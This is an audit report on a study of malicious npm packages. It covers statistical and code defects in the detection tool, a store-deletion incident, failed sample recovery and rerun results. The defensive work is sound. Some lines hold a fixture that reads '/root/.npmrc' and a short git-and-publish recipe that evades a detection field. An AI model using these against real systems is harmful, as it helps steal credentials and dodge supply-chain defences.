# Audit of A3/A5 — v1.3.0 reviewed, v1.4.0 published

The capability run of 2026-08-18 (`capability-results/capability-control-2026-08-18-*`)
was audited line by line before any of it was believed. Four independent reviews
— capability semantics, statistics, control construction, leakage and scoring —
raised fourteen findings; each was handed to a separate reviewer instructed to
refute it. **Six survived, eight did not**, and two of the six were the same
defect reached from different directions (D1 below, found by both the control
review and the leakage review) — so the audit produced **five** distinct defects.
The sixth recorded here, D6, did not come from that audit at all: it came out of
asking why 17 flagged packages were still alive, which is a separate
investigation written up further down.

Every number below was re-derived from `capability-results/*.json` or from
`norte-guard-captures/` directly, not read off the prose report.

The reruns are `capability-control-2026-08-19-v1.4.0.json` and its report.

> **Superseded in part on 2026-08-21.** The corpus reached 8 case accounts and the
> study was re-run: `capability-control-2026-08-21-v1.4.0.json`. Everything about
> the *defects* below still stands — they are what the code does now. What has
> moved is every *number* measured on the 3-account cohort, and two of them moved
> a long way. See [What the 8-account rerun changed](#what-the-8-account-rerun-changed)
> at the foot of this file before quoting anything from the tables above it.

---

## What the run says, now that it says it first

**At the primary unit, nothing is established.** That was true in v1.3.0 too; it
was on page four, under a row that said `SEPARATES`.

| capability | cases r/n/? | controls r/n/? | difference | verdict |
|---|---|---|---|---|
| `credential_read` | 0 / 0 / 3 | 3 / 10 / 36 | — | not calculable |
| `network_egress` | 0 / 0 / 3 | 10 / 11 / 28 | — | not calculable |
| `external_exec` | 1 / 0 / 2 | 12 / 13 / 24 | +52.0pp, CI −41.9 to +77.3 | inconclusive |
| `dynamic_code` | 1 / 0 / 2 | 5 / 13 / 31 | +72.2pp, CI −24.3 to +91.8 | inconclusive |

Two capabilities have no denominator. The other two rest on **one** determined
case. All four control rates (23%, 48%, 48%, 28%) sit above the run's own
pre-registered ceiling of 20.4%, so none of them could have separated whatever
the cases did.

The one `SEPARATES` row in the output is `dynamic_code` at the capture unit,
+78.4pp. All 36 of its reached captures are **one package**, `@siwatfa/yorn`,
from one account — and it is also the only `bytecode`+`minified` member of the
cohort. A cluster bootstrap over the 3 independent publishers gives CI −17.3 to
+92.5, including zero, with 29.2% of resamples ≤ 0 ≈ (2/3)³. The arithmetic was
never wrong; the unit was.

**Report layout changed accordingly.** `headlineOf` in `capability-control.ts`
computes the finding from the comparisons and prints it above them, `PRINT_ORDER`
puts the primary unit first and the capture unit last, and the pseudo-replication
warning is printed inside the capture block instead of waiting for the caveats.

---

## The confirmed defects

### D1 — the primary unit folded 18 control packages into 2 bots
`src/capability-control.ts:195` (fix at `:198-224`)

`publisher: raw._npmUser?.name ?? maintainers?.[0]?.name` — the fallback fires
when `_npmUser` is *missing*, never when it is npm's OIDC trusted-publishing
identity. Measured on the captured version:

```
_npmUser="GitHub Actions"  17 packages -> 10 distinct real maintainer accounts
_npmUser="CircleCI"         1 package  ->  1
38 real publishers + 2 bot identities = the 40 that were reported
```

Worse than a rate: `atUnit` keeps the earliest capture per group, so the merge
**discarded 16 of the 60 measured control packages** from the primary analysis.
The case arm publishes with tokens and never trips it, so the error was
one-sided and shrank the control side alone.

Fixed by `isTrustedPublisherIdentity` / `publisherOf`, keyed on the
`trustedPublisher` object (present on all 18) and on the shared
`npm-oidc-no-reply@github.com` address.

| | v1.3.0 | v1.4.0 |
|---|---|---|
| publisher-unit controls | 40 | **49** |
| detectability ceiling | 8 of 40 (20.0%) | **10 of 49 (20.4%)** |
| `external_exec` | +50.0pp | **+52.0pp** |
| `dynamic_code` | +76.9pp | **+72.2pp** |

### D2 — 12 of 99 control captures were outside the declared caliper
`src/capability-control.ts:727` before the fix, now `:795-825`

The match draws one representative per control package and checks the caliper
there. The measured set is *every* capture of that package in the window, and
the band was never re-checked on it.

```
worst ratio, actual:   11.39x  1.29x  1.01x  6.53x  1.03x  3.79x
worst ratio, printed:   1.02x  1.01x  1.01x  1.04x  1.03x  1.03x
```

`@vanillaskyai/sdk` was matched to `@siwatfa/yorn` at 26,605,866 B and measured
at 2,289,754 B — **11.39×** against a declared 1.995× — inside the one arm
carrying the `SEPARATES` row. The report presented that table as *"where the size
control is checked, and the only place it can be"*.

Fixed: the caliper is re-applied on expansion, dropped captures are listed as
`outOfCaliper`, and `worstRatioOver` computes the printed ratio over the measured
set. Capture-unit controls 99 → **87**; `dynamic_code` +80.8 → **+78.4pp**.

### D3 — 20 of 99 controls were never opened, and the blinding caveat quoted half
`src/capability-control.ts:1337` (caveat), `src/cli.ts:666` (per-unit lines)

`grep -i refus` over the v1.3.0 report returns nothing. In the JSON,
`refusedToAnalyse` was 20 at the capture unit and 13 at the primary one — 17
archives hold no JavaScript at all (TypeScript-only, CSS, markdown) and 3 are
past the size bound. They answer indeterminate to all four exactly as an opaque
member does, and they sit in the denominator of every printed bound.

The differential-blinding caveat said **88% vs 15%**. Counting both failures it
is **88% vs 33%** on the corrected control set. `blindedAtEntry` is now a field
on every group, and the CLI prints opacity, never-opened, and the union as three
separate lines per unit.

### D4 — "three of the four control rates are above that ceiling" — it is four
`docs/methodology.md:192`

The sentence names the publisher unit ("three independent cases and forty
controls") but the three rates it counted were the *capture* unit's, measured
against the *publisher* unit's ceiling. Against their own ceiling of 79.3% none
of them clears it. The one that silently dropped out of the list was
`dynamic_code` — the row the surrounding table highlights. Corrected, and the
paragraph now says why the old count was wrong.

### D5 — three per-module bounds dropped facts without a lost point
`src/reachability.ts:554, 584, 603`

`MAX_MODULE_ORIGINS`, `MAX_AMBIENT_PER_MODULE` and `MAX_CALL_ARGUMENTS_PER_MODULE`
each `return` with no `noteLost`. Past the bound `capabilitiesOf` sees neither
the evidence nor a blinder and answers `not-reached` — the exact failure the
three-valued answer exists to prevent, and the opposite of the contract stated in
the comment above `MAX_AMBIENT_PER_MODULE`. Reproduced on a fixture: `fs.readFileSync('/root/.npmrc')`
after 100 `path.join` calls is `reached`; after 600 it is **`not-reached` with an
empty `blindedBy`**.

**This moved no number in either run** — verified by rerunning the full A5 with
the three guards reverted and diffing all 40 unit×side×capability cells: **0
differ**. What makes it worth fixing is that the exposure is one-sided: **25 of
99 controls saturate a bound, 0 of 42 cases do**. Any future run with a larger or
bundled control cohort depresses control rates and inflates every case-minus-
control difference.

Fixed by blinding **per fact type**, not by folding into `depth-limit` (which
blinds all four and *would* have moved four rows):

| lost reason | blinds |
|---|---|
| `argument-bound` | `credential_read` only — it is the one capability that reads arguments |
| `ambient-bound` | `credential_read`, `network_egress`, `dynamic_code` — `process.env`, `fetch`, `eval`/`Function` |
| `origin-bound` | all four — every capability is answered off the origin list |

### D6 — the promotion gate was reading a frozen sweep
`src/watchlist.ts:353`

`verdictsFromCaptures` required the capture to carry `label: confirmed_malicious`
with an npm-takedown source. Relabelling only ever happened for the six packages
A5 needed. The removal record itself — `takedown-log.ndjson` plus four rotations,
503 rows, **233 distinct removed names** — was never consulted, and neither was
`readLiveTakedowns`, which already reads all of it.

53 of those 233 have a capture; 36 were captured through quarantine; **25 are
captures of npm's own `0.0.1-security` tombstone** and prove nothing; the
remaining **11 are genuine pre-removal observations**:

```
async-critical-section  bcs-core   bcs-mini      keyed-mutex-map  kit-hydration-vim
leb128x  resource-lease-pool  single-flight-lock  sui-gql-core  svelte-goal-vim
try-lock-runner
```

Five of them are five of the six A5 case packages, captured 2.8–6.9 h before
removal. Precision by capture arm, over distinct packages:

| arm | packages | pre-removal TP | precision |
|---|---|---|---|
| `quarantine-no-genome` (the class) | 2,786 | **11** | 0.395% |
| `watcher-threshold` (the score) | 7,374 | 1 (`@siwatfa/yorn`) | 0.014% |

Fixed: `verdictsFromCaptures` now takes the removal-record name set, excludes
tombstone captures explicitly, and the CLI passes `readLiveTakedowns(dir)`.

Note the distinction the codebase already draws and that this does not erase:
these 11 confirm the **capture filter**. The five-condition *rule* still has **0**
verified removals — 8 snapshots carry no download count and 3 carry a vacuous
zero — so nothing here promotes the rule.

**Recounted on 2026-08-21: 25 removals, 16 unverifiable, 8 vacuous-zero, 1
rule-cleared, and still 0 rule-matched.** The zero is not a small number that is
growing. It is structural, and the rerun section at the foot of this file measures
why.

---

## What was refuted

Eight findings did not survive. The two worth recording:

- **"The equivalence margin and primary unit were chosen after seeing a number."**
  False. `PRIMARY_UNIT = 'publisher'` and `EQUIVALENCE_MARGIN = 0.20` are fixed
  at `capability-control.ts:100` and `:76`, above any code that runs, and
  `test/capabilities.test.ts` pins both.
- **"`z = 3.02` is the wrong correction."** It is Bonferroni over 20 comparisons
  (4 capabilities × 5 units) at α = 0.05, and reproduces to nine decimal places.
  The family is conservative — the five units are five views of one dataset, not
  independent — and conservative is the safe direction.

---

## The class: `noGenome` was never a condition

`inClass = noGenome && young && tiny && !hasRepository` is now
`young && tiny && !hasRepository`.

`hasGenomeRegime` requires a first analysed version at least
`MIN_AGE_DAYS_FOR_GENOME = 90` days old; `young` is a name under
`YOUNG_NAME_DAYS = 7`. **`young` entails `noGenome`, with 83 days of margin.**

Measured over all 114,545 marked publications in `changes-log*`:

| conjunct | marginal | P(X \| the other three) | rows it removes |
|---|---|---|---|
| **`noGenome`** | 56.12% | **100.0000%** | **0** |
| `young` | 22.96% | 57.19% | 2,732 |
| `tiny` | 33.57% | 48.03% | 3,949 |
| `!hasRepository` | 26.81% | 31.84% | 7,813 |

26,297 rows have `young=true`; **0** of them are under the genome regime. The
class is byte-identical without the conjunct, and
`test/collector.test.ts` now asserts that over every combination the classifier
can produce. `quarantineRejects.withGenome` is kept as the last branch of the
reject chain, where it reads 0 by construction — a standing check that the
entailment has not broken.

**The same redundancy exists one level over**, in `fabricated-profile.ts`: the
rule's "four free conditions" are `noGenome`, `youngName`, `tiny`,
`noRepository`, and the first is entailed by the second there too. That is the
build-failing rule rather than the description, so it was left alone
deliberately and is recorded here as a decision, not an oversight.

---

## The 17 survivors, and why the ceiling was the wrong shape

17 packages the class flagged are alive with ≥10 weekly downloads
(`tracking-log.ndjson`, sweep of 2026-08-18T19:24). All 17 are `T T T` on the
three surviving conjuncts, 14 of 17 scored 17 and passed, **17 of 17 ship a
README**, 16 of 17 are scoped, across 15 distinct maintainers, all flagged inside
one 42-minute window on 2026-08-12. The class describes *a new npm package*.

`PROMOTION_MAX_FALSE_POSITIVES = 1` — an absolute count of false positives, ever
— was measured against the actual flow:

```
6 full days in changes-log*:  19,091 publications/day, class fires on 3.187%
                            =    608 packages flagged per day (range 50-1,136)
```

One false positive for all time against 608 flags a day is not a strict
criterion, it is an unreachable one — and an unreachable bar gets crossed by
somebody lowering it, not by the rule improving. It is replaced by a **rate**
stated the way an operator would state it:

```
PROMOTION_MAX_FALSE_POSITIVES_PER_DAY = 1
PROMOTION_MAX_FALSE_POSITIVE_RATE     = 1 / 608 = 0.164%
```

tested on the **upper 95% Wilson bound**, which the count version could not be:
an observed zero over four packages proves nothing, and on the bound it does not
pass. With 0 observed the rate needs **2,332 tracked packages** to clear; the
gate reports that distance in its own refusal. Added alongside it:
`PROMOTION_MIN_TAKEDOWN_PUBLISHERS = 3`, because 11 true positives from 4
accounts — 6 of them one account publishing near-identical lock/mutex stubs in a
week — is closer to 4 events than to 11.

Where that leaves the gate today, from `norte-guard track`:

> 17 of 33 tracked are false positives — **51.5%**, upper 95% bound 67.5%,
> against a ceiling of 0.164%. At 17 observed this needs 16,548 tracked packages
> to clear, and there are 33.

**As of 2026-08-21 that reads 17 of 42 — 40.5%, upper 95% bound 55.5%, and there
are 42.** The denominator moved because eight more quarantine removals entered
the capture arm; the numerator did not move at all. Only the 16,548 survives
unchanged, because it depends on the 17 alone. See
[What the 8-account rerun changed](#what-the-8-account-rerun-changed).

`test/collector.test.ts` asserts the new criterion **is reachable**: a clean
record at `minimumTrackedFor(0)` with three removals from three accounts
promotes.

---

## `!gitHead` as a fifth conjunct — measured, and rejected

Measured before adoption, on the denominator rather than on the nine samples that
suggested it.

| population | n | `!gitHead` |
|---|---|---|
| all captures | 17,903 | 40.37% |
| class fires | 5,017 | 43.43% |
| class does not fire | 12,886 | 39.17% |

Lift **1.076**. The field is near-independent of the class and close to a coin
flip on everything.

- **12 of 12** genuine pre-removal captures have `!gitHead` (the earlier "9/9"
  undercounted; all 12 were evaluable).
- **6 of 17** survivors have it — and 35.3% is *not* below the class base rate of
  43.43%: one-sided binomial P(X ≤ 6 | n=17, p=0.4343) = **0.337**. The survivor
  side, which is where a useful conjunct would prove itself, is statistically
  silent.
- Volume −56.6% (3.19% → 1.38% of the feed), recall 11/11 retained, precision
  0.376% → 0.795%. **Both are >99% false positive.** A coin-flip field halving
  the denominator would be reportable as a "2.1× precision improvement".
- The 11 class-firing true positives come from **4 npm accounts**. At the honest
  clustering p = 0.036, not 1e-4; Wilson bound on retained recall [51%, 100%].
- **Evasion is free**: `gitHead` is `git rev-parse HEAD` of the publish
  directory. `git init && git commit --allow-empty && npm publish` sets it. The
  corpus already shows the field is not per-publish even for honest publishers —
  one hash appears across 120 different packages.
- Not an OIDC proxy (trusted-publisher captures are 42.2% vs 38.9%, the wrong
  direction for the toolchain story) but it **is** a size proxy: within the class
  it runs 83.9% under 1 KB and 35.7% at 5–20 KB. The class already selects tiny.

**Not adopted.** What would change that: ≥16 consecutive all-`!gitHead` genuine
pre-removal true positives for a 95% lower bound of 80% on retained recall (35
for 90%), from ≥6 independent publisher accounts, and a survivor cohort where
prevalence is significantly below 43.4%. Current: 11 TPs, 4 accounts. Retaining
`_npmVersion` in `normalizePackument` — one line — would make the toolchain
confound testable instead of undecidable.

---

## Still open

- `credential_read` is the one capability carrying hand-written lists
  (`SECRET_PATHS`, `TOKEN_ENV_WORDS`). Its measured exposure is **0 evidence on
  the case side at all five units** and all of it on the control side, so the
  deviation from "no new patterns" pushes the difference *down*. Conservative,
  but real, and named.
- The repaired secret-path definition (`joinPathSegments`) is post-hoc and cannot
  be validated by a run that saw the cases. It stays in the POST HOC block until
  a confirmed sample nobody has opened tests it.
- Both arms still pass through the same enriched capture filter, so this compares
  confirmed removals against the rest of what the filter kept — not against npm.

---

## What is publishable, and what the power table is for

The finding is **descriptive, and it is about opacity**. A count of what the
artifacts contain needs no power calculation — but it does still need a unit, and
"37 of 42 captures" is the capture unit, which is the one this whole audit was
about. The honest statement gives all three:

| unit | cases | controls |
|---|---|---|
| capture | **37 / 42 = 88.1%** | 15 / 87 = 17.2% |
| package | 2 / 6 = 33.3% | 12 / 60 = 20.0% |
| publisher | 2 / 3 = 66.7% | 12 / 49 = 24.5% |

The 37 opaque captures are **two packages**: `@siwatfa/yorn`, which is bytecode
and minified and was captured 36 times, and `kit-hydration-vim`, a native binary
captured once. So the 88% is one operator's republication rate wearing the shape
of a prevalence, exactly as `dynamic_code` was — and stating it as "37 of 42,
n=42" would repeat the error this document exists to correct.

What survives at every unit is the direction, and that is the publishable claim:

> Of the six packages npm removed and this collector caught before the removal,
> **two ship an executable no parser reads** — a V8 bytecode cache with minified
> code, and a native binary. Those two are two of the three operators. In
> size-matched packages npm did not remove, the figure is 12 of 60 packages. The
> counts are small and are given as counts; no interval is claimed.

That is weaker than "88% versus 17%" and it is the one that is true. The strong
version is available only at the unit where one package is counted 36 times.

**The per-capability claim is the one that is not available**, and the power
table is what says so rather than an apology for it:

| case determinate share | 100% | 75% | 50% | 33% | 25% |
|---|---|---|---|---|---|
| `credential_read` (ctrl 23%) | 24 | 30 | 40 | 55 | 72 |
| `network_egress` (ctrl 48%) | 28 | 38 | 55 | 74 | 96 |
| `external_exec` (ctrl 48%) | 28 | 34 | 50 | 76 | 100 |
| `dynamic_code` (ctrl 28%) | 26 | 32 | 40 | 61 | 80 |

Publishers needed for a +30pp difference to separate at the family-adjusted z,
by how often a case yields a determinate answer. Today there are **3**, and the
determinate share is 1/3 for `external_exec` and `dynamic_code` and 0/3 for the
other two.

The temptation is to read that table as a schedule — wait for 61 publishers and
the answer arrives. It is not. Every column but the first assumes the case side
stays partly unreadable, and **the unreadability is the phenomenon**. A cohort
that became legible enough to fill the 100% column would be a cohort of
attackers who had stopped hiding. Waiting for the case arm to become analysable
is waiting for the thing being studied to stop happening.

So the table earns its place by justifying a refusal: at n=3 publishers, with two
of four capabilities returning no determinate case at all, no per-capability
difference is claimable, and no amount of patience at the current arrival rate
changes that within the horizon the corpus covers. The opacity count does not
have that problem, and it is the stronger result anyway.

---

## The object store: 3,190 tarballs deleted while still referenced

Found while asking why two of the five publishers with a genuine pre-removal
capture cannot enter A5. Audited across the whole corpus, at a snapshot of
22,836 captures and 17,447 stored objects.

**Were the bytes ever downloaded?** Yes, provably. The manifest records a
64-hex sha256 per version, written at `ngpack.ts:104` as
`manifest.objects[ver] = stored.sha256` — the return value of
`putObject(buf)`, which hashes the buffer. npm's packument carries `dist.shasum`
(sha1) and `dist.integrity` (sha512) and **no 64-hex string anywhere**, so the
recorded hash cannot have been copied from metadata. Confirmed on a survivor:
for `bcs-core@1.0.0` the stored object is a gzip tarball whose sha256 equals the
manifest hash and whose sha1 equals npm's `dist.shasum`. The bytes were fetched,
hashed and written. They were deleted afterwards.

**Three axes, as the shape of the answer:**

| cut | result |
|---|---|
| by engine / date | **step function** — 0.3.2: 95.7%, 1.0.0: 95.2%, and **0.0% for 1.1.0, 1.2.0, 1.2.1, 1.3.0, 1.4.0** across 17,588 references |
| by size | **flat** — 96.1% under 10KB, 95.7% at 10-100KB, 93.4% at 1-10MB, 93.4% at 10-32MB, 97.9% at ≥32MB. No cliff at the 32MB `--max-capture-mb` bound |
| by position within a run | **flat** — 15.3%, 15.0%, 15.1%, 15.2%, 15.1%, 15.1%, 15.5%, 15.4%, 15.5%, 14.7% by decile. No end-of-run concentration |

Not dispersed across all three, so not a non-transactional write. One historical
episode, bounded in time.

**The mechanism, and why retention is a red herring.** `collectOrphanObjects` is
mark-and-sweep: an object survives if a capture on disk names its hash. It never
reads `retainUntil`. All 3,190 deleted objects **are still named by manifests on
disk** — that is how this audit found them — so the sweep deleted *referenced*
objects, which it can only do if its scan of the captures directory came back
empty or nearly so. Manifests record `objectStore` as a cwd-relative path
(`norte-guard-captures/captures`), and resolving it against the wrong working
directory produces exactly that. Corroborating: of the 1,611 orphans that carry
a `retainUntil`, **1,611 have a `retainUntil` still in the future** — none
expired. Nothing aged out; a scan failed.

**Is it still active?** No, and the reasoning has to be careful, because the
obvious check does not work: of the 3,543 present objects carrying a
`retainUntil`, **zero have reached it**, so "no orphans since 1.1.0" cannot by
itself distinguish "fixed" from "not yet due". What resolves it is that this
failure mode is age-independent — a failed scan deletes referenced objects
whatever their retention date — so 17,588 references surviving over five days of
continuous collection is evidence, not an artifact of youth. A live dry run of
the current sweep against the store confirms it: **0 objects it would delete, 0
bytes, no refusal.**

Two defences now stand: the store root no longer follows `manifest.objectStore`
(v1.1.0), and `ORPHAN_SWEEP_MAX_SHARE = 0.5` refuses any sweep that finds more
than half the store unreferenced (v1.2.1, commit `69bca94`). The second is a
blast-radius bound, not a proof: a *partial* scan failure yielding under 50%
apparent orphans would still delete. A sweep that verified its own scan — refuse
if the referenced set is empty, or if it fell sharply since the last run —
would close that, and is not written.

**The cost, in evidence.** **31 confirmed_malicious captures** lost their bytes,
not six. Six are the pre-removal observations that cost A5 two publishers —
`async-critical-section`, `keyed-mutex-map`, `resource-lease-pool`,
`single-flight-lock`, `try-lock-runner` (all `javonayers999`) and `bcs-mini`
(`graypin`). Five more are the `fabricated_family` tombstones. **The other twenty
are early versions of `@siwatfa/yorn`** — 1.0.1 through 1.0.30 — which is why that
package has 56 captures and only 36 with bytes. The case arm did not just lose
two publishers to this sweep; it lost more than a third of the republication
series of the one package it does have.

That is **two of the five publishers** with a genuine pre-removal capture, and it
is why A5's case arm is 3 publishers rather than 5 — a sweep, not a shortage of
attacks.

**The leak is now reported rather than discovered.** `auditObjectIntegrity` walks
the manifests against the store and the watcher prints the result on the startup
line beside the budget, because the only reason this was ever found is that
somebody went looking, and an object store leaks silently by construction —
nothing reads a tarball until a question is asked of it weeks later. The total is
a scar and stays constant, so what the line emphasises is the delta against the
previous start:

```
Object store: 18647/21837 tarballs present, 3190 MISSING, 2026-08-12..2026-08-14
              — 31 of them labelled (no change since last start)
```

and, when it moves:

```
              — 31 of them labelled  <-- 10 NEW SINCE LAST START
  Bytes that were fetched and hashed are gone. These packages are removed from
  npm within hours, so they cannot be re-fetched at any price. Find what deleted
  them before capturing more.
```

The check costs 829 ms over 21,837 references.

**Write ordering was already correct**, and is now commented so an edit does not
reverse it: `createNgpack` writes every object to the store first and the manifest
last, so a crash mid-capture leaves unreferenced bytes — which the sweep collects
— and never a reference to bytes that were never written, which nothing can
repair. What was missing is that the manifest write was not atomic: a plain
`writeFileSync` truncated by a crash leaves JSON no reader can parse, and a
capture whose manifest does not parse is a capture whose objects look
unreferenced to the sweep — the same store-eating failure through a different
door. `writeJsonAtomic` now writes to a temp file and renames.

---

## Recovery of the six lost tarballs: none, and what survives instead

Attempted against registry.npmjs.org, skimdb, unpkg, jsDelivr (six edges plus
statically.io), Software Heritage, the Wayback Machine, npmmirror, yarnpkg,
Tencent, Huawei, deps.dev and npm's attestations endpoint. **Zero of six
recovered as bytes**, zero as file trees.

Every source returns the same thing: the registry serves the `0.0.1-security`
placeholder and 404s the tarball; skimdb has no stale replication document; every
CDN resolves against live npm and so has nothing; the Wayback Machine has no
captures. Software Heritage is the instructive one — it holds an npm origin for
all six, but **every visit postdates the takedown**. The packages were removed
roughly seven hours after publication (five of the six by `javonayers999` inside
a five-minute window on 2026-08-13, `bcs-mini` by `graypin` the next day), and
SWH's crawler arrived about thirty minutes late. Seven hours is not long enough
to get mirrored.

**Two of the six left per-file metadata behind, and it authenticates.** jsDelivr's
data API still answers for them, and the file list sums exactly to the
`unpackedSize` and `fileCount` in the packument this project captured before the
removal — an independent match on two fields, so the record is genuine:

`single-flight-lock@1.0.0` — 5 files, 3,578 B (packument: 3,578 / 5)

| file | bytes | sha256 (base64) |
|---|---|---|
| `/index.js` | 1277 | `Cj7muW/R6IHavcCgTr0AjNFnnTenRrbsxE82WiZpZaQ=` |
| `/index.d.ts` | 192 | `nH86sOBDIuzOZZJFy80Mhp0TfsK9UDKoLe5JZ8HJ4lk=` |
| `/LICENSE` | 1060 | `F5xyKRWJ6s19SE15pFyJjwcYL+KuYjA5kM41dbM2JV4=` |
| `/package.json` | 519 | `mrhB60oxTh9kJXLEfTb/mZIO/kUK5Pa5gTSif2ked1Y=` |
| `/README.md` | 530 | `Mao1rBZedPvLEWXbWuVZed+zaMiF/3E6wdU04MllYcI=` |

`bcs-mini@1.0.1` — 3 files, 4,607 B (packument: 4,607 / 3)

| file | bytes | sha256 (base64) |
|---|---|---|
| `/index.js` | 3877 | `uWXQT6fUBJJQL761Ny7juvHDOMsOF/xbmHaPYflmt0Q=` |
| `/package.json` | 391 | `Nf+NHVU5tjx+mWAg/56vsM5eSAP2+8Bb/DSaVrl7SWo=` |
| `/README.md` | 339 | `6d+2jbH/QUQfHKlmH466/fuX6otOGCVezLeKUWp7Azc=` |

Transcribed here because jsDelivr will purge it eventually and this file is
version-controlled. If the bytes ever surface, they can be verified file by file.

One thing this metadata already settles without the bytes: **neither package is
opaque.** No `.node`, no `.wasm`, no bytecode — five and three plain source files
respectively. Whatever those two did, they did it in readable JavaScript, so
their absence from the case arm does not bias the opacity count in either
direction.

The full sha256 the project recorded for each lost tarball, kept so a future
match is checkable:

```
async-critical-section@1.0.0  01d51cf18526bbc4c5512fc8f1c34aa465b992b36cb95021674028aca0c933e1
keyed-mutex-map@2.1.2         9086d5deff052c06a8761ddca1958c435acceab0885dc8c0dc545cbcbbe9e663
resource-lease-pool@1.4.2     939525ec2c034dae185d1767190fc3a45807aa5e513afb72563efffe7cd4be18
single-flight-lock@1.0.0      62d7f2aa8bc88eae20a21cd6f7aad6a2e23c1c5c7b03d0254820f009156a1bdd
try-lock-runner@3.2.1         28d5ca79bc3cd7770e8f665d3ac31fbb23c4c408d092ae4ab228e7930d102c75
bcs-mini@1.0.1                848a514a14a54fc5fff9c4312c9580870a2a19073e5eef114c0e7519d0cf64dd
```

A later attempt at `bcs-mini@1.0.1` through unpkg was checked directly and
returns 404 on all three URL forms (`/-/bcs-mini-1.0.1.tgz`, the package root,
and `/browse/`), as do the other five. Nothing was recovered from any source; the
case arm stays at 3 publishers.

Public retrieval is exhausted. What remains is a party that resolved these during
the seven-hour live window — an upstream proxy or CI cache (Verdaccio,
Artifactory, Nexus, a GitHub Actions npm cache) on whatever host ran the original
collector, or npm security, who hold the samples they removed. Neither is
retrieval work.

---

## What the 8-account rerun changed

Run on 2026-08-21 against a corpus of 23,781 captures: 87 confirmed removals, 56
of them still holding bytes. The case arm went from **42 captures / 6 packages /
3 accounts** to **56 / 15 / 8**, and the control pool from 7,611 in-window
captures to 21,384. Artifact: `capability-control-2026-08-21-v1.4.0.json`.

The primary-unit conclusion is unchanged and is now worth more: **nothing is
established.** What changed is *why*.

| | 2026-08-19 (3 accounts, 49 controls) | 2026-08-21 (8 accounts, 125 controls) |
|---|---|---|
| `credential_read` | not calculable — 0 determinate cases | **−6.1pp**, CI −24.8 to +63.6 |
| `network_egress` | not calculable — 0 determinate cases | **+15.7pp**, CI −22.2 to +63.6 |
| `external_exec` | +52.0pp, CI −41.9 to +77.3 | **−12.9pp**, CI −37.8 to +45.6 |
| `dynamic_code` | +72.2pp, CI −24.3 to +91.8 | **+17.4pp**, CI −15.4 to +66.3 |
| control rates | 23%, 48%, 48%, 28% — **all four above the ceiling** | 6.1%, 24.3%, 32.9%, 15.9% — **all four below it** |

Two things in that table are the result.

**The run stopped being structurally incapable.** In v1.4.0 all four control
rates sat above the run's own detectability ceiling of 20.4%, which means no
configuration of the case arm could have separated anything: the null was
guaranteed by the design, not found by it. At 8 accounts against a control pool
2.8× larger the four rates are all under their ceilings. This is the first run of
A5 that could have returned a finding, and it returned none.

**The two point estimates that had survived collapsed, and one flipped sign.**
`external_exec` went +52.0pp → −12.9pp and `dynamic_code` +72.2pp → +17.4pp. Both
had rested on **one** determinate case. The audit refused to publish them and the
refusal is now measured rather than argued: five more accounts moved one estimate
across zero and cut the other to a quarter. Anyone who had read the v1.3.0
`SEPARATES` row as a finding would now be retracting it.

`credential_read` and `network_egress` acquired a denominator for the first time
— 4 and 5 determinate cases against 0 before. Neither separates.

### The opacity claim, restated at the current n

This is the finding the study can support, and it holds:

| unit | cases | controls |
|---|---|---|
| capture | 38 / 56 = 67.9% | 12 / 216 = 5.6% |
| package | 3 / 15 = 20.0% | 9 / 150 = 6.0% |
| publisher | 2 / 8 = 25.0% | 9 / 125 = 7.2% |
| publisher-any | **3 / 8 = 37.5%** | 9 / 125 = 7.2% |

Three case packages ship an executable no parser reads — `@siwatfa/yorn` (V8
bytecode, minified), `kit-hydration-vim` (a native binary) and `ai-texts`
(minified) — from three distinct accounts. At the package unit the case rate
against size-matched survivors is 20.0% vs 6.0%, where at 6 packages it was 33.3%
vs 20.0%. **Both rates fell and the control rate fell further** — the larger pool
is a cleaner one — so the ratio widened from 1.7x to 3.3x while the case share
itself went down. The ratio is the thing that moved; neither rate on its own
should be quoted as an increase.

The claim in the publishable form the audit settled on, updated:

> Of the fifteen packages npm removed and this collector caught before the
> removal, **three ship an executable no parser reads** — a V8 bytecode cache
> with minified code, a native binary, and a minified bundle. Those three are
> three of the eight accounts. In size-matched packages npm did not remove, the
> figure is 9 of 150 packages. The counts are small and are given as counts.

### D7 — the `-any` units folded the answers and not the scan

`src/capability-control.ts:397` (fix at `foldScans`)

Found by this rerun. `atUnit` unioned `answers` and `repaired` at the `package-any`
and `publisher-any` units and then spread `...earliest`, so the member carried the
**earliest capture's `scan`**. Every scan-derived counter in `summariseGroup` —
opacity, never-opened, blinded-at-entry, external dependency, both halves of
`credential_read` — therefore described one capture at a unit whose declared
contract, in the comment above `atUnit`, is "did this package, or this operator,
**ever** demonstrate it".

It hit the headline. `publisher-any` printed `2 of 8` opaque while three accounts
ship an opaque package, because `rihannasmith`'s earliest capture is
`ai-texts-utils` and the minified one is `ai-texts`. The unit that exists to say
what an operator ever did was the one understating it.

The fold is deliberately **not** a blanket OR, because two of these fields record
a demonstration and two record a failure to look:

| field | folds by |
|---|---|
| `opaqueExecutable`, `externalModules`, `secretPathsReached`, `tokenEnvRead` | **any** capture — a thing demonstrated once is demonstrated, the same lattice `unionAnswers` uses |
| `refusal`, `entryPoints` | **every** capture — "never opened at all" means not once, and a unit with one readable capture was opened |

Measured effect, and it is confined to the two `-any` rows: `publisher-any`
opacity 2/8 → **3/8**, blinded-at-entry 2/8 → **3/8**, external dependency 2/8 →
**4/8**, and `package-any` external dependency on the control side 51/150 →
52/150. **No capability answer, interval or verdict moved** — those were already
unioned — so the correction changes what the run reports about itself and not
what it reports about the four capabilities.

### The power table, rebuilt against the control arm that exists

The table at the head of this file was computed against 49 control publishers.
That arm no longer exists; it is 125. It also used the member count where the
comparison uses the **determinate** count, and `compareAt` compares
`overDeterminate` against `overDeterminate` — so `credential_read` is a test on
49 controls, not on 125, and a requirement quoted against 125 is a requirement for
a comparison this study does not make.

Rebuilt, and now queryable rather than transcribed — `norte-guard corpus --publishers`:

| capability | ctrl rate | of | case determinate | ceiling at 8 | accounts needed | first separates |
|---|---|---|---|---|---|---|
| `credential_read` | 6.1% | 49 | 50% | 26.5% | **41** | 31 |
| `network_egress` | 24.3% | 70 | 63% | 32.9% | **56** | 52 |
| `external_exec` | 32.9% | 79 | 63% | 32.9% | **60** | 49 |
| `dynamic_code` | 15.9% | 69 | 75% | 36.2% | **37** | 30 |

The last two columns differ because **separation is not monotone in n**. Both the
account count and the reach count round to whole publishers, so `credential_read`
separates at 31 accounts and then fails again at 33, 34, 39 and 40 before holding
from 41; `external_exec` separates at 49 and fails at 51, 54, 55, 56 and 59 before
holding from 60. The first version of this table printed only the left-hand
number, which is the n at which the answer first happens to land the right way up
